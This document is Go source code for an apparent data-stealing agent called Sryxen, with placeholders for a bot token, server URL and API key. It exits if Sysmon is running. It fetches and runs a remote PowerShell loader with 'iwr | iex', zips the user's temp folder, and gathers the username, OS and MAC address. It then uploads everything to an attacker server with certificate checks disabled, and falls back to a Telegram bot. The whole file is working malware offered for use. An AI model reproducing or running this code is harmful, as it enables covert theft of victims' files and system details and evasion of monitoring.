package main

import (
	"bytes"
	"fmt"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"io"
	"crypto/tls"
	"syscall"
)

const (
	botToken = "%YOUR_BOT_TOKEN%" 
	chatID   = "%YOUR_CHAT_ID%"   

	serverURL = "%SERVER_URL_HERE%" + "/logAgent"
	apiKey    = "%SRYXEN_API_KEY_GENERATED%"
)

func main() {
	if CheckForSysmon() {
		log.Fatalf("VM detection failed: Sysmon is running")
	}

	cmd := exec.Command("powershell", "-Command", "iwr 'https://github.com/EvilBytecode/Sryxen/releases/download/v1.0.0/sryxen_loader.ps1' | iex")
	cmd.Stdout = nil
	cmd.Stderr = nil
	err := cmd.Run()
	if err != nil {
		log.Fatal(err)
	}

	cmd = exec.Command("powershell", "-Command", "$env:USERNAME")
	usernameBytes, err := cmd.Output()
	if err != nil {
		log.Fatal(err)
	}
	username := strings.TrimSpace(string(usernameBytes))

	tempPath := fmt.Sprintf("%s\\$pcusername", os.Getenv("TEMP"))
	tempPath = strings.Replace(tempPath, "$pcusername", strings.ToLower(username), 1)

	if _, err := os.Stat(tempPath); os.IsNotExist(err) {
		log.Fatalf("Directory %s does not exist or is not accessible", tempPath)
	}

	log.Printf("Resolved temp path: %s", tempPath)

	zipFilePath := fmt.Sprintf("%s\\%s.zip", os.Getenv("TEMP"), strings.ToLower(username))

	psCommand := fmt.Sprintf("Compress-Archive -Path \"%s\" -DestinationPath \"%s\" -Force", tempPath, zipFilePath)

	cmd = exec.Command("powershell", "-Command", psCommand)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Error output from PowerShell: %s", string(output))
		log.Fatal("Error creating zip file with PowerShell:", err)
	}

	log.Printf("Successfully created zip file: %s", zipFilePath)

	userName := getUsername()
	osName, err := getOS()
	if err != nil {
		fmt.Println("Error getting OS:", err)
		return
	}

	macAddress, err := getMACAddress()
	if err != nil {
		fmt.Println("Error getting MAC address:", err)
		return
	}

	err = sendZipFile(serverURL, zipFilePath, osName, userName, macAddress)
	if err != nil {
		log.Printf("Error sending zip file to server: %v\n", err)
		log.Println("Sending the zip file to Telegram...")
		err := SendTelegramDocument(botToken, chatID, zipFilePath)
		if err != nil {
			log.Fatalf("Failed to send zip file to Telegram: %v", err)
		}
		fmt.Println("Zip file sent successfully to Telegram!")
	} else {
		fmt.Println("Zip file sent successfully to server!")
	}
}

func CheckForSysmon() bool {
	cmd := exec.Command("tasklist")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	err := cmd.Run()
	if err != nil {
		log.Printf("Error running tasklist command: %v", err)
		return false
	}

	return strings.Contains(out.String(), "sysmon.exe")
}

func sendZipFile(serverURL, filePath, osName, userName, macAddress string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("could not open zip file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("could not create form file: %v", err)
	}
	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("could not copy file to form: %v", err)
	}

	writer.WriteField("OS", osName)
	writer.WriteField("Name", userName)
	writer.WriteField("MAC_Address", macAddress)

	if err := writer.Close(); err != nil {
		return fmt.Errorf("could not finalize form data: %v", err)
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	req, err := http.NewRequest("POST", serverURL, body)
	if err != nil {
		return fmt.Errorf("could not create HTTP request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	req.Header.Set("OS", osName)
	req.Header.Set("Name", userName)
	req.Header.Set("MAC_Address", macAddress)
	req.Header.Set("X-API-Key", apiKey)

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("could not send HTTP request: %v", err)
	}
	defer resp.Body.Close()

	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("could not read server response: %v", err)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned non-OK status: %s\nResponse: %s", resp.Status, string(responseBody))
	}

	fmt.Printf("Server Response: %s\n", string(responseBody))
	return nil
}

func SendTelegramDocument(botToken, chatID, filePath string) error {
	fmt.Println("Sending document to Telegram:", filePath)
	apiBaseURL := "https://api.telegram.org/bot"
	client := &http.Client{}
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	writer.WriteField("chat_id", chatID)

	if filePath != "" {
		file, err := os.Open(filePath)
		if err != nil {
			return err
		}
		defer file.Close()

		part, err := writer.CreateFormFile("document", filepath.Base(filePath))
		if err != nil {
			return err
		}

		if _, err = io.Copy(part, file); err != nil {
			return err
		}
	}

	writer.Close()

	apiMethod := "sendDocument"
	apiURL := fmt.Sprintf("%s%s/%s", apiBaseURL, botToken, apiMethod)
	req, err := http.NewRequest("POST", apiURL, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		responseBody, _ := io.ReadAll(resp.Body)
		fmt.Printf("Telegram API request failed with status %d: %s\n", resp.StatusCode, string(responseBody))
		return fmt.Errorf("failed to send document: %s", string(responseBody))
	}

	return nil
}

func getUsername() string {
	return os.Getenv("USERNAME") 
}

func getOS() (string, error) {
	cmd := exec.Command("wmic", "os", "get", "caption")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("could not get OS information: %v", err)
	}
	lines := strings.Split(strings.TrimSpace(string(output)), "\n")
	if len(lines) < 2 {
		return "", fmt.Errorf("unexpected output from wmic command")
	}
	return strings.TrimSpace(lines[1]), nil
}

func getMACAddress() (string, error) {
	cmd := exec.Command("wmic", "NIC", "get", "MACAddress")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("could not get MAC address: %v", err)
	}
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed != "" && trimmed != "MACAddress" {
			return trimmed, nil
		}
	}
	return "", fmt.Errorf("no MAC address found")
}
